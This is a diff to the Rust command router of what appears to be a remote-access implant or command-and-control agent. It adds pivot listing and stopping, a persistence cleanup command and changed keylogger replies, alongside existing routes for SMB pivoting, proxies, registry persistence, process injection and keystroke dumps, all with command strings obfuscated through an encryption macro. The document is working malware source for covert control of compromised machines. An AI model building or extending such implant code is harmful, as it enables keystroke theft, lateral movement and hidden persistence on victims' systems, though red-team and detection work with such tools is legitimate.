@@ -74,6 +74,19 @@ macro_rules! lock_or_action {
 // Re-export macros for submodules
 pub(crate) use lock_or_action;
 
+// Keylogger capture exists only on Windows; the stub strings from
+// keylogger::start()/stop() elsewhere are failures, so they go out on the
+// error channel with a non-zero exit code rather than as a success reply.
+#[cfg(target_os = "windows")]
+fn keylogger_reply(msg: String) -> DispatchResult {
+    DispatchResult::Reply(msg, String::new(), 0, AgentAction::None)
+}
+
+#[cfg(not(target_os = "windows"))]
+fn keylogger_reply(msg: String) -> DispatchResult {
+    DispatchResult::Reply(String::new(), msg, 1, AgentAction::None)
+}
+
 pub(crate) fn wrap_result(r: Result<String, String>) -> DispatchResult {
     match r {
         Ok(msg) => DispatchResult::Reply(msg, String::new(), 0, AgentAction::None),
@@ -146,6 +159,12 @@ async fn route(ctx: &HandlerContext, cmd: &str, req_id: u64) -> DispatchResult {
     if let Some(args) = cmd.strip_prefix(&aes_str!("pivot:listener_smb ")) {
         return network::handle_pivot_smb(ctx, args).await;
     }
+    if cmd == aes_str!("pivot:list") {
+        return network::handle_pivot_list(ctx).await;
+    }
+    if let Some(args) = cmd.strip_prefix(&aes_str!("pivot:stop ")) {
+        return network::handle_pivot_stop(ctx, args).await;
+    }
     if cmd.starts_with(&aes_str!("proxy:start ")) {
         let (o, e, c) = network::handle_proxy_start(ctx, cmd, req_id).await;
         return DispatchResult::Reply(o, e, c, AgentAction::None);
@@ -175,6 +194,7 @@ async fn route(ctx: &HandlerContext, cmd: &str, req_id: u64) -> DispatchResult {
 
     // ── Persistence ────────────────────────────────────────────────
     if cmd == aes_str!("persist:list") { return persistence::handle_list(); }
+    if cmd == aes_str!("persist:cleanup") { return persistence::handle_cleanup().await; }
 
     // Windows
     if let Some(a) = cmd.strip_prefix(&aes_str!("persist:run_hklm_remove ")) { return persistence::handle_run_hklm_remove(a); }
@@ -272,8 +292,8 @@ async fn route(ctx: &HandlerContext, cmd: &str, req_id: u64) -> DispatchResult {
     }
     if let Some(args) = cmd.strip_prefix(&aes_str!("migrate:spawn "))  { return process::handle_migrate_spawn(ctx, args, req_id); }
     if let Some(args) = cmd.strip_prefix(&aes_str!("migrate:inject ")) { return process::handle_migrate_inject(ctx, args, req_id); }
-    if cmd == aes_str!("keylogger:start") { return DispatchResult::Reply(crate::agent::keylogger::start(), String::new(), 0, AgentAction::None); }
-    if cmd == aes_str!("keylogger:stop")  { return DispatchResult::Reply(crate::agent::keylogger::stop(), String::new(), 0, AgentAction::None); }
+    if cmd == aes_str!("keylogger:start") { return keylogger_reply(crate::agent::keylogger::start()); }
+    if cmd == aes_str!("keylogger:stop")  { return keylogger_reply(crate::agent::keylogger::stop()); }
     if cmd == aes_str!("keylogger:dump") {
         let logs = crate::agent::keylogger::get_logs();
         let out = if logs.is_empty() { aes_str!("(Buffer Empty)") } else { logs };
